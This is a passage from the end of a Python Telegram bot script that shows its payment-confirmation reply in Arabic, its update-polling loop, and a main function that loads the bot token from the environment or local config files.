                f"⭐ Stars مدفوعة: {payment.get('total_amount',0)}\n"
                f"💎 استمتع بجميع المميزات!\n\n"
                f"👋 {MY_SIGNATURE}")
        except Exception as e:
            send_message(self.token, chat_id,
                f"✅ <b>تم استلام الدفع بنجاح!</b>\nتم التفعيل تلقائياً.")

    # ── Main polling loop ─────────────────────────────────────────────────────

    def run(self):
        _load_local_cache()
        print(f"[BOT] Starting MULTI-TOOL MASTER BOT — @hulliyu")
        print(f"[BOT] Token: {self.token[:20]}..." if self.token else "[BOT] ⚠️ No BOT_TOKEN!")

        while True:
            try:
                updates = get_updates(self.token, offset=self.offset, timeout=30)
                for upd in updates:
                    self.offset = upd["update_id"] + 1
                    try:
                        if "message" in upd:
                            msg = upd["message"]
                            if "successful_payment" in msg:
                                self.handle_payment(msg)
                            elif "document" in msg:
                                self.handle_document(msg)
                            elif "text" in msg:
                                self.handle_message(msg)
                            elif "photo" in msg or "video" in msg:
                                pass  # ignore media
                        elif "callback_query" in upd:
                            self.handle_callback(upd["callback_query"])
                        elif "pre_checkout_query" in upd:
                            self.handle_pre_checkout(upd["pre_checkout_query"])
                    except Exception as e:
                        print(f"[ERR] Update handler: {e}")
            except KeyboardInterrupt:
                print("[BOT] Stopped by user.")
                break
            except Exception as e:
                print(f"[ERR] Polling: {e}")
                time.sleep(3)


# ══════════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

def main():
    token = os.environ.get("BOT_TOKEN","").strip()
    if not token:
        # Try reading from .env or config files
        for fname in [".env","config.txt","bot.txt"]:
            if os.path.exists(fname):
                try:
                    with open(fname,"r") as f:
                        for line in f:
                            if "BOT_TOKEN" in line or "TOKEN" in line:
                                parts = line.strip().split("=",1)
                                if len(parts) == 2:
                                    token = parts[1].strip().strip('"').strip("'")
                                    break
                except Exception:
                    pass
            if token:
                break

    if not token:
        print("⚠️  BOT_TOKEN not set! Set it via environment variable:")
        print("    export BOT_TOKEN='your_bot_token_here'")
        print("Or add it directly to the BOT_TOKEN variable at the top of this file.")
        sys.exit(1)

    bot = MasterBot(token)
    bot.run()


if __name__ == "__main__":
    main()
